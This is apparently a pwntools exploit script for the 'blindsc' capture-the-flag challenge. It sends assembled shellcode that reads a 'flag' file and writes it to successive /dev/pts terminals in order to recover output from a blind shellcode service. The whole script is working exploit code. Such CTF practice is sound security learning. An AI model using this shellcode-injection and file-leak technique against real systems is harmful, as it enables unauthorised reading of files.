#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'
context.binary = elf = ELF('./blindsc', checksec=False)

'''
$file /proc/self/fd/1
    /proc/self/fd/1: symbolic link to /dev/pts/7
'''
id = 0
while True:
    io = process(elf.path)
    #io = remote("host3.dreamhack.games", 18377)
    print(f"attemp /dev/pts/{id}")
    payload = \
    asm(shellcraft.amd64.open("flag", 2) +  shellcraft.amd64.read(4, "rsp", 0x64) \
    + shellcraft.amd64.open(f"/dev/pts/{id}", 2) + shellcraft.amd64.write(5, "rsp", 0x64))
    io.sendlineafter(b'Input shellcode: ', payload)
    sleep(0.1)
    io.close()
    id += 1
io.interactive()